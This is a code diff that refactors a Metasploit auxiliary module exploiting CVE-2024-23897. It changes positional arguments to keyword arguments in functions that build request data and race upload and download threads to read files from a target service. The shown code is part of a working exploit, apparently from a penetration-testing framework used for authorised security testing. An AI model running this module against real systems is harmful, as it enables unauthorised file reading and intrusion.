@@ -130,7 +130,7 @@ class MetasploitModule < Msf::Auxiliary
     "\x03\x00\x00\x01\x31\x00\x00\x00"
   end
 
-  def data_generator(pad =  false)
+  def data_generator(pad: false)
     data = []
     data << request_header
     data << parameter_one if pad
@@ -143,7 +143,7 @@ class MetasploitModule < Msf::Auxiliary
     data.join('')
   end
 
-  def upload_request(uuid, multi_line_file = true)
+  def upload_request(uuid, multi_line_file: true)
     # send upload request asking for file
 
     # In testing against Docker image on localhost, .01 seems to be the magic to get the download request to hit very slightly ahead of the upload request
@@ -161,7 +161,7 @@ class MetasploitModule < Msf::Auxiliary
       'vars_get' => {
         'remoting' => 'false'
       },
-      'data' => data_generator(multi_line_file)
+      'data' => data_generator(pad: multi_line_file)
     )
 
     fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
@@ -241,7 +241,7 @@ class MetasploitModule < Msf::Auxiliary
     use_pad = false
     threads = []
     threads << framework.threads.spawn('CVE-2024-23897', false) do
-      upload_request(uuid, use_pad) # try single line file first since we get an error if we have more content to get
+      upload_request(uuid, multi_line_file: use_pad) # try single line file first since we get an error if we have more content to get
     end
     threads << framework.threads.spawn('CVE-2024-23897', false) do
       download_request(uuid)
@@ -259,7 +259,7 @@ class MetasploitModule < Msf::Auxiliary
       use_pad = true
       threads = []
       threads << framework.threads.spawn('CVE-2024-23897-upload', false) do
-        upload_request(uuid, use_pad)
+        upload_request(uuid, multi_line_file: use_pad)
       end
       threads << framework.threads.spawn('CVE-2024-23897-download', false) do
         download_request(uuid)
